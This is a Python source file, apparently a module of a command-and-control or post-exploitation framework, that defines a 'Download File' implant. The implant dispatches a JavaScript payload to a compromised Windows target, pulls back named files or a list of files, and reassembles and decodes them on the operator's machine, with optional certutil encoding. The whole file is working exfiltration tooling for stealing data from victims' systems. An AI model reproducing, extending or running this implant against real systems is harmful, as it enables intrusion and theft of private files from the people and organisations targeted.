import core.job
import core.implant
import uuid
import time
import os

class DownloadFileImplant(core.implant.Implant):

    NAME = "Download File"
    DESCRIPTION = "Downloads a remote file off the target system."
    AUTHORS = ["RiskSense, Inc."]
    STATE = "implant/util/download_file"

    def load(self):
        self.options.register("LPATH", "/tmp/", "local file save path")
        self.options.register("RFILE", "", "remote file to get", required=False)
        self.options.register("RFILELIST", "", "file containing line-seperated file names to download", required=False)
        self.options.register("RFILEF", "", "", hidden=True)
        self.options.register("CHUNKSIZE", "10000000", "size in bytes (kind of) of chunks to save, helps avoid MemoryError exceptions", required=True)
        self.options.register("CERTUTIL", "false", "use certutil to base64 encode the file before downloading", required=True, boolean=True)

    def job(self):
        return DownloadFileJob

    def run(self):
        rfile = self.options.get("RFILE")
        rfilelist = self.options.get("RFILELIST")
        if not rfile and not rfilelist:
            self.shell.print_error("Need to define either RFILE or RFILELIST")
            return

        payloads = {}
        if rfilelist:
            file = open(rfilelist, 'r')
            files = file.read().splitlines()
            for f in files:
                self.options.set("RFILEF", f.replace("\\", "\\\\").replace('"', '\\"'))
                payloads["js"] = "data/implant/util/download_file.js"
                self.dispatch(payloads, self.job)
        else:
            self.options.set("RFILEF", self.options.get('RFILE').replace("\\", "\\\\").replace('"', '\\"'))
            payloads["js"] = "data/implant/util/download_file.js"
            self.dispatch(payloads, self.job)

class DownloadFileJob(core.job.Job):
    def report(self, handler, data, sanitize = False):
        status = handler.get_header("Status", False)
        if status == "NotExist":
            self.notexist = True

        if not status:
            self.save_fname = self.options.get("LPATH") + "/" + self.options.get("RFILE").split("\\")[-1]
            self.save_fname = self.save_fname.replace("//", "/")

            while os.path.isfile(self.save_fname):
                self.save_fname += "."+uuid.uuid4().hex

            i = 0
            step = int(self.options.get("CHUNKSIZE"))
            partfiles = []
            datalen = len(data)
            while i < datalen:
                with open(self.save_fname+str(i), "wb") as f:
                    partfiles.append(self.save_fname+str(i))
                    end = i+step
                    if end > datalen:
                        end = datalen
                    while True:
                        try:
                            pdata = self.decode_downloaded_data(data[i:end], handler.get_header("encoder", "1252"))
                        except:
                            end -= 1
                            continue
                        break
                    try:
                        # if the data is just a text file, we want to decode correctly and then re-encode
                        pdata = pdata.decode('cp'+handler.get_header("encoder", "1252")).encode()
                    except:
                        pass
                    f.write(pdata)
                i = end

            with open(self.save_fname, "wb+") as f:
                for p in partfiles:
                    f.write(open(p, "rb").read())
                    os.remove(p)
            self.save_len = len(data)

            if self.options.get("CERTUTIL") == "true":
                with open(self.save_fname, "rb") as f:
                    data = f.read()
                data = self.decode_downloaded_data(data, "936")
                with open(self.save_fname, "wb") as f:
                    f.write(data)



        # with open(self.save_fname, "wb") as f:
        #     data = self.decode_downloaded_data(data, handler.get_header("encoder", "1252"))
        #     try:
        #         # if the data is just a text file, we want to decode correctly and then re-encode
        #         data = data.decode('cp'+handler.get_header("encoder", "1252")).encode()
        #     except:
        #         pass
        #     f.write(data)
        #     self.save_len = len(data)
            try:
                if self.notexist:
                    self.error(0, "%s does not exist" % (self.options.get("RFILE")), "FileNotExist", "")
                    self.results = "%s does not exist" % (self.options.get("RFILE"))
            except:
                super(DownloadFileJob, self).report(handler, data, False)
        handler.reply(200)

    def done(self):
        rfile = self.options.get("RFILE")
        if self.save_len == 0:
            self.print_warning("The file is empty")
        self.results = "%s saved to %s (%d bytes)" % (rfile, self.save_fname, self.save_len)
        self.display()

    def display(self):
        try:
            if self.notexist:
                self.shell.print_error(self.results)
        except:
            self.shell.print_good(self.results)
